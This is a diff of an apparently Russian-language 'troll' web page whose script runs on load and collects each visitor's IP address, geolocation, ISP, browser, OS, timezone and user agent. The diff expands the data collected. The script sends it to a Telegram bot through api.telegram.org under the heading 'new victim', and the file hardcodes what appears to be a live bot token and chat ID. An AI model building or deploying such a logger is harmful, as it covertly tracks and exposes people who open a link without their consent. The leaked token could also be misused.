@@ -19,7 +19,7 @@
             border-radius: 20px;
             padding: 30px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-            max-width: 500px;
+            max-width: 600px;
             width: 90%;
         }
         h1 {
@@ -35,8 +35,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         .info-block p {
-            margin: 10px 0;
-            padding: 10px;
+            margin: 8px 0;
+            padding: 8px;
             border-bottom: 1px solid #eee;
             display: flex;
             justify-content: space-between;
@@ -77,96 +77,126 @@
 
     <script>
         // =============================================
-        // НАСТРОЙКИ - ЗАМЕНИ НА СВОИ ДАННЫЕ
+        // НАСТРОЙКИ - ТВОИ ДАННЫЕ
         // =============================================
-        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw'; // Твой токен бота
-        const chatId = '1238755996'; // Твой Chat ID
+        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
+        const chatId = '1238755996';
         
         // =============================================
-        // ФУНКЦИЯ ПОЛУЧЕНИЯ IP (РАБОЧАЯ ВЕРСИЯ)
+        // ПОЛУЧЕНИЕ ДАННЫХ О БРАУЗЕРЕ
+        // =============================================
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Неизвестно";
+            let os = "Неизвестно";
+            
+            // Определяем браузер
+            if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
+            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
+            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
+            else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
+            else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
+            else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
+            
+            // Определяем ОС
+            if (ua.indexOf("Windows NT 10.0") > -1) os = "Windows 10/11";
+            else if (ua.indexOf("Windows NT 6.2") > -1) os = "Windows 8";
+            else if (ua.indexOf("Windows NT 6.1") > -1) os = "Windows 7";
+            else if (ua.indexOf("Mac OS X") > -1) os = "macOS";
+            else if (ua.indexOf("iPhone") > -1) os = "iOS (iPhone)";
+            else if (ua.indexOf("iPad") > -1) os = "iOS (iPad)";
+            else if (ua.indexOf("Android") > -1) os = "Android";
+            else if (ua.indexOf("Linux") > -1) os = "Linux";
+            
+            return { browser, os };
+        }
+        
+        // =============================================
+        // ПОЛУЧЕНИЕ IP И ГЕО-ДАННЫХ
         // =============================================
         async function getIpInfo() {
-            // Пробуем разные API по очереди
-            const apis = [
-                'https://api.myip.com/',
-                'https://ip.nf/me.json',
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json'
-            ];
-            
-            for (let api of apis) {
-                try {
-                    console.log('Пробуем API:', api);
-                    const response = await fetch(api);
-                    
-                    if (!response.ok) {
-                        console.log('API не ответил:', api);
+            try {
+                // Пробуем разные API
+                const apis = [
+                    'https://api.myip.com/',
+                    'https://ip.nf/me.json',
+                    'https://ipapi.co/json/'
+                ];
+                
+                for (let api of apis) {
+                    try {
+                        const response = await fetch(api);
+                        const data = await response.json();
+                        
+                        if (data.ip) {
+                            return {
+                                ip: data.ip,
+                                country: data.country || data.country_name || 'Неизвестно',
+                                city: data.city || 'Неизвестно',
+                                region: data.region || 'Неизвестно',
+                                isp: data.org || data.isp || data.organisation || 'Неизвестно'
+                            };
+                        }
+                    } catch (e) {
                         continue;
                     }
-                    
-                    const data = await response.json();
-                    console.log('Ответ от API:', data);
-                    
-                    // Преобразуем ответы разных API в единый формат
-                    let result = {
-                        ip: null,
-                        city: 'Неизвестно',
-                        country_name: 'Неизвестно',
-                        region: 'Неизвестно',
-                        org: 'Неизвестно'
-                    };
-                    
-                    // Обрабатываем разные форматы ответов
-                    if (data.ip) result.ip = data.ip;
-                    if (data.city) result.city = data.city;
-                    if (data.country) result.country_name = data.country;
-                    if (data.country_name) result.country_name = data.country_name;
-                    if (data.region) result.region = data.region;
-                    if (data.org) result.org = data.org;
-                    if (data.organisation) result.org = data.organisation;
-                    
-                    if (result.ip) {
-                        console.log('Успешно получили IP:', result);
-                        return result;
-                    }
-                } catch (e) {
-                    console.log('Ошибка с API', api, e);
-                    continue; // Пробуем следующий API
                 }
-            }
-            
-            // Если ничего не сработало, пробуем через прокси
-            try {
-                console.log('Пробуем через прокси...');
+                
+                // Если ничего не сработало, пробуем через прокси
                 const proxyResponse = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipapi.co/json/'));
                 const wrapper = await proxyResponse.json();
                 const data = JSON.parse(wrapper.contents);
                 
                 return {
                     ip: data.ip,
+                    country: data.country_name || 'Неизвестно',
                     city: data.city || 'Неизвестно',
-                    country_name: data.country_name || 'Неизвестно',
                     region: data.region || 'Неизвестно',
-                    org: data.org || 'Неизвестно'
+                    isp: data.org || 'Неизвестно'
                 };
-            } catch (e) {
-                console.log('Прокси тоже не сработал:', e);
+            } catch (error) {
+                console.error('Ошибка:', error);
                 return null;
             }
         }
         
         // =============================================
-        // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
+        // ОТПРАВКА В TELEGRAM (МАКСИМУМ ИНФЫ)
         // =============================================
-        async function sendToTelegram(data) {
-            const message = `🕵️ <b>НОВЫЙ ПОСЕТИТЕЛЬ!</b>
+        async function sendToTelegram(ipData, browserInfo) {
+            const now = new Date();
+            const timeStr = now.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+            
+            // Определяем время у пользователя (часовой пояс браузера)
+            const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const userTime = new Date().toLocaleString('ru-RU', { timeZone: userTimezone });
+            
+            // Тип устройства
+            let deviceType = "Компьютер";
+            if (navigator.userAgent.match(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i)) {
+                deviceType = "Мобильное устройство";
+            }
+            
+            // Собираем сообщение
+            const message = `🔥 <b>НОВАЯ ЖЕРТВА!</b> 🔥
 
-📍 <b>IP адрес:</b> ${data.ip}
-🏙️ <b>Город:</b> ${data.city}
-🌍 <b>Страна:</b> ${data.country_name}
-🗺️ <b>Регион:</b> ${data.region}
-📡 <b>Провайдер:</b> ${data.org}
-⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+📍 <b>IP:</b> ${ipData.ip}
+🌍 <b>Страна:</b> ${ipData.country}
+🏙️ <b>Город:</b> ${ipData.city}
+🗺️ <b>Регион:</b> ${ipData.region}
+📡 <b>Провайдер:</b> ${ipData.isp}
+
+💻 <b>Браузер:</b> ${browserInfo.browser}
+📱 <b>ОС:</b> ${browserInfo.os}
+📟 <b>Тип:</b> ${deviceType}
+🕐 <b>Часовой пояс:</b> ${userTimezone}
+
+⏰ <b>Его время:</b> ${userTime}
+🤖 <b>Время розыгрыша:</b> ${timeStr}
+
+🕵️ <b>User Agent:</b> 
+<code>${navigator.userAgent.substring(0, 100)}...</code>`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -180,46 +210,48 @@
                         parse_mode: 'HTML'
                     })
                 });
-                console.log('Сообщение отправлено в Telegram');
+                console.log('Отправлено в Telegram');
             } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
+                console.error('Ошибка отправки:', error);
             }
         }
         
         // =============================================
-        // ФУНКЦИЯ ПОКАЗА ИНФОРМАЦИИ
+        // ПОКАЗ НА СТРАНИЦЕ
         // =============================================
         async function showInfo() {
             const infoDiv = document.getElementById('info');
-            infoDiv.innerHTML = '<p class="loading">Получаем данные...</p>';
+            infoDiv.innerHTML = '<p class="loading">Собираю данные...</p>';
             
             const ipData = await getIpInfo();
+            const browserInfo = getBrowserInfo();
             
             if (ipData && ipData.ip) {
+                // Показываем на странице
                 infoDiv.innerHTML = `
                     <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
+                    <p><span class="label">Страна:</span> <span>${ipData.country}</span></p>
                     <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
-                    <p><span class="label">Страна:</span> <span>${ipData.country_name}</span></p>
-                    <p><span class="label">Регион:</span> <span>${ipData.region}</span></p>
-                    <p><span class="label">Провайдер:</span> <span>${ipData.org}</span></p>
+                    <p><span class="label">Провайдер:</span> <span>${ipData.isp}</span></p>
+                    <p><span class="label">Браузер:</span> <span>${browserInfo.browser}</span></p>
+                    <p><span class="label">ОС:</span> <span>${browserInfo.os}</span></p>
+                    <p><span class="label">Часовой пояс:</span> <span>${Intl.DateTimeFormat().resolvedOptions().timeZone}</span></p>
                 `;
                 
                 // Отправляем в Telegram
-                await sendToTelegram(ipData);
+                await sendToTelegram(ipData, browserInfo);
             } else {
-                infoDiv.innerHTML = '<p class="loading">Не удалось получить информацию об IP</p>';
+                infoDiv.innerHTML = '<p class="loading">Не удалось получить данные</p>';
             }
         }
         
-        // =============================================
-        // ОБРАБОТЧИК КЛИКА ПО КАРТИНКЕ
-        // =============================================
+        // Клик по картинке
         document.getElementById('trollImage').addEventListener('click', function() {
-            alert('🔍 Обновляю информацию...');
+            alert('🔍 Обновляю данные...');
             showInfo();
         });
         
-        // Запускаем при загрузке страницы
+        // Запуск при загрузке
         showInfo();
     </script>
 </body>
